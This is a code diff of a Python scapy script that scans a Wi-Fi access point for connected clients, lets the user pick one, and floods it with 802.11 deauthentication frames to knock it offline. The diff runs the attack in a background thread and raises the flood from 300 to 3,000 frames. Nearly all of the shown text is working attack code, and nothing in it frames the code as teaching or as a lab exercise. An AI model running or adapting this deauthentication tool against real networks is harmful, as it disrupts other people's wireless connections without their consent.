@@ -1,8 +1,8 @@
 from scapy.all import * 
 import os
 import sys
-#import _thread
-#import time
+import threading
+import time
 
 iface = ""
 users_list = []
@@ -36,7 +36,7 @@ def Users_handler(pkt):
     if pkt.type == 2:
         if pkt.addr2 not in users_list and pkt.addr1 == ap_mac:
             users_list.append(pkt.addr2)
-            print(len(users_list), pkt.addr2)
+            print(len(users_list),"     " ,pkt.addr2)
     
 
 
@@ -46,7 +46,7 @@ def DisConnectAttack(target_mac , gateway_mac, iface):
 	# stack them up
 	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
 	# send the packet
-	sendp(packet, inter=0.1, count=300, iface=iface, verbose=1)
+	sendp(packet, inter=0.3, count=1000*3, iface=iface,verbose=1)
 
 
 def main():
@@ -63,7 +63,10 @@ def main():
     if len(users_list) > 0 :
         user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
         user_mac = users_list[user_adder]
-        DisConnectAttack(target_mac = user_mac , gateway_mac = ap_mac, iface = iface)
+        disconnectThread= threading.Thread(target= DisConnectAttack, args= (user_mac ,ap_mac, iface ,))
+        disconnectThread.start()
+        time.sleep(3)
+        print("process keep going...")
 
 
 if __name__ == "__main__":
